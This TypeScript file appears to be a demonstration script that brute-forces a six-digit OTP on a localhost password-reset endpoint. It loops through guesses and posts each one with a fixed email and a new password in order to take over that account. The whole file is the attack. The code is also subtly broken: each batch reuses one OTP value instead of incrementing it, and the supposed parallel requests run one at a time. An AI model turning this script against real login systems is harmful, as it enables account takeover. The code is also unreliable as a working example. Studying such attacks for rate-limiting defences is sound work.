import axios from "axios";

async function attackNow({email, otp, newPassword}: {email: string, otp: string, newPassword: string}) {
    let data = JSON.stringify({
        email,
        otp,
        newPassword
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };

      try {
        await axios.request(config)
        console.log("done for " + otp);
      } catch(e) {
        // @ts-ignore
        console.log(e.response.data);
        console.log("failed for " + otp);
      }
}

async function main() {
    for(let i = 0; i < 999999; i+=100) {
        let p = [];
        for (let j = 0; j < 100; j++) {
            p.push(await attackNow({
                email: "sahil@gmail.com",
                otp: (i).toString(),
                newPassword: "Newpassword"
            }))
        }
        await Promise.all(p);
    }
}

main()